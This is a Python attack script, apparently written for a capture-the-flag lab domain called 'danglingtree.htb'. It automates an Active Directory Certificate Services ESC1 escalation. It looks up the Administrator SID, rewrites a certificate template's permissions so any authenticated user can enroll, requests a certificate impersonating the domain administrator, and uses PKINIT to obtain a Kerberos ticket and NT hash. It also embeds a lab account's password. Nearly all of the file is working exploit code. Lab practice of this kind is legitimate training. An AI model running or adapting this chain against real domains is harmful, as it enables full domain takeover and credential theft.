#!/usr/bin/env python3
"""danglingtree — ESC1 → Domain Admin cert + NT hash.

Prereqs:
  - jake.h password (FCP from alex.o) and ESC1 template ready
    (EmployeeAuthTemplate owned by jake, SAN + Client Auth, enroll Auth Users)
  - clock ≈ DC (run scripts/sync_time_to_dc.sh first)
  - certipy-ad in PATH

Steps:
  1) Ensure template nTSecurityDescriptor allows Authenticated Users enroll (ESC1 SD)
  2) certipy req -upn administrator@... -sid <domain-500>
  3) certipy auth → TGT + NT hash

Usage:
  ./sync_time_to_dc.sh
  python3 esc1_get_admin.py
  python3 esc1_get_admin.py --jake-pass '...' --out-dir ../loot/certs
"""
from __future__ import annotations

import argparse
import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

DOMAIN = "danglingtree.htb"
CA = "danglingtree-DC-CA"
TEMPLATE = "EmployeeAuthTemplate"
DEFAULT_JAKE = "Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan"


def run(cmd: list[str], cwd: Path | None = None) -> subprocess.CompletedProcess:
    print("[*]", " ".join(cmd[:6]), "..." if len(cmd) > 6 else "")
    return subprocess.run(cmd, cwd=cwd, capture_output=True, text=True)


def domain_sid_admin(dc_ip: str, user: str, password: str) -> str:
    """LSA PolicyAccountDomainInfo → domain SID + -500."""
    code = f"""
from impacket.dcerpc.v5 import transport, lsat, lsad
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
stringbinding = r'ncacn_np:{dc_ip}[\\pipe\\lsarpc]'
rpctransport = transport.DCERPCTransportFactory(stringbinding)
rpctransport.set_credentials({user!r}, {password!r}, 'danglingtree.htb')
dce = rpctransport.get_dce_rpc()
dce.connect(); dce.bind(lsat.MSRPC_UUID_LSAT)
policy = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | 0x00000800)
resp = lsad.hLsarQueryInformationPolicy2(
    dce, policy['PolicyHandle'],
    lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
sid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()
print(sid + '-500')
dce.disconnect()
"""
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True)
    if r.returncode != 0:
        raise RuntimeError(f"SID lookup failed: {r.stderr or r.stdout}")
    sid = r.stdout.strip().splitlines()[-1].strip()
    if not sid.startswith("S-1-"):
        raise RuntimeError(f"bad SID: {sid!r}")
    return sid


def ensure_enroll_sd(dc_ip: str, jake_user: str, jake_pass: str, template: str, out_dir: Path) -> None:
    """Write create_sd(S-1-5-11) onto template if ESC1 not enrollee-visible."""
    # try find first
    r = run(
        [
            "certipy-ad",
            "find",
            "-u",
            f"{jake_user}@{DOMAIN}",
            "-p",
            jake_pass,
            "-dc-ip",
            dc_ip,
            "-vulnerable",
            "-stdout",
        ]
    )
    if "ESC1" in r.stdout and template in r.stdout and "User Enrollable" in r.stdout:
        print(f"[+] {template} already looks ESC1-enrollable")
        return

    print(f"[*] fixing enroll DACL on {template}")
    cfg_path = out_dir / f"{template}-cur.json"
    r = run(
        [
            "certipy-ad",
            "template",
            "-u",
            f"{jake_user}@{DOMAIN}",
            "-p",
            jake_pass,
            "-dc-ip",
            dc_ip,
            "-template",
            template,
            "-save-configuration",
            str(cfg_path),
            "-force",
        ]
    )
    print(r.stdout or r.stderr)
    if not cfg_path.exists():
        # certipy may write with odd name
        cands = list(out_dir.glob(f"*{template}*.json"))
        if not cands:
            raise RuntimeError("could not save template config")
        cfg_path = cands[0]

    from certipy.lib.security import create_sd  # type: ignore

    cfg = json.loads(cfg_path.read_text())
    cfg["nTSecurityDescriptor"] = "HEX:" + create_sd("S-1-5-11").getData().hex()
    esc = out_dir / f"{template}-esc1sd.json"
    esc.write_text(json.dumps(cfg, indent=2))
    r = run(
        [
            "certipy-ad",
            "template",
            "-u",
            f"{jake_user}@{DOMAIN}",
            "-p",
            jake_pass,
            "-dc-ip",
            dc_ip,
            "-template",
            template,
            "-write-configuration",
            str(esc),
            "-force",
            "-no-save",
        ]
    )
    print(r.stdout or r.stderr)
    if "Successfully updated" not in (r.stdout + r.stderr):
        print("[!] template update may have failed — continue if already ESC1")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--dc-ip", default=os.environ.get("DC_IP", "10.129.6.118"))
    ap.add_argument("--jake-user", default="jake.h")
    ap.add_argument("--jake-pass", default=os.environ.get("JAKE_PASS", DEFAULT_JAKE))
    ap.add_argument("--template", default=TEMPLATE)
    ap.add_argument(
        "--out-dir",
        type=Path,
        default=Path(__file__).resolve().parent.parent / "loot" / "certs",
    )
    ap.add_argument("--skip-sd", action="store_true", help="skip template DACL fix")
    args = ap.parse_args()
    args.out_dir.mkdir(parents=True, exist_ok=True)
    os.chdir(args.out_dir)

    if shutil.which("certipy-ad") is None:
        print("[-] certipy-ad not in PATH", file=sys.stderr)
        return 1

    print("[*] resolving Administrator SID")
    admin_sid = domain_sid_admin(args.dc_ip, args.jake_user, args.jake_pass)
    print(f"[+] ADMIN_SID={admin_sid}")

    if not args.skip_sd:
        ensure_enroll_sd(args.dc_ip, args.jake_user, args.jake_pass, args.template, args.out_dir)

    out = args.out_dir / "admin-esc1-sid"
    for p in args.out_dir.glob("*admin-esc1-sid*"):
        p.unlink(missing_ok=True)

    print("[*] requesting cert (UPN administrator + SID)")
    r = run(
        [
            "certipy-ad",
            "req",
            "-u",
            f"{args.jake_user}@{DOMAIN}",
            "-p",
            args.jake_pass,
            "-dc-ip",
            args.dc_ip,
            "-target-ip",
            args.dc_ip,
            "-ca",
            CA,
            "-template",
            args.template,
            "-upn",
            f"administrator@{DOMAIN}",
            "-sid",
            admin_sid,
            "-out",
            str(out),
        ]
    )
    print(r.stdout)
    print(r.stderr, file=sys.stderr)

    # certipy may sanitize path with underscores in CWD
    pfx = None
    for cand in [
        Path(str(out) + ".pfx"),
        args.out_dir / "admin-esc1-sid.pfx",
        *Path.cwd().glob("*admin-esc1-sid*.pfx"),
        *Path.home().glob("*admin-esc1-sid*.pfx"),
    ]:
        if cand.exists() and cand.stat().st_size > 0:
            pfx = cand
            break
    if not pfx:
        print("[-] no pfx produced — check RPC / template / clock", file=sys.stderr)
        return 1

    dest = args.out_dir / "admin-esc1-sid.pfx"
    if pfx.resolve() != dest.resolve():
        shutil.copy2(pfx, dest)
        pfx = dest
    print(f"[+] pfx={pfx} ({pfx.stat().st_size} B)")

    ccache = args.out_dir / "administrator.ccache"
    ccache.unlink(missing_ok=True)
    print("[*] PKINIT auth")
    r = run(
        [
            "certipy-ad",
            "auth",
            "-pfx",
            str(pfx),
            "-dc-ip",
            args.dc_ip,
        ]
    )
    print(r.stdout)
    print(r.stderr, file=sys.stderr)
    # move ccache if written to cwd
    for cand in Path.cwd().glob("administrator*.ccache"):
        shutil.move(str(cand), str(args.out_dir / "administrator.ccache"))
        break
    # parse hash
    for line in (r.stdout + r.stderr).splitlines():
        if "Got hash" in line or "aad3b435" in line.lower():
            print("[+]", line.strip())
    print("[*] next:")
    print(f"  export KRB5CCNAME={args.out_dir / 'administrator.ccache'}")
    print("  # or NTLM hash from above:")
    print(f"  python3 {Path(__file__).resolve().parent / 'get_flags.py'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
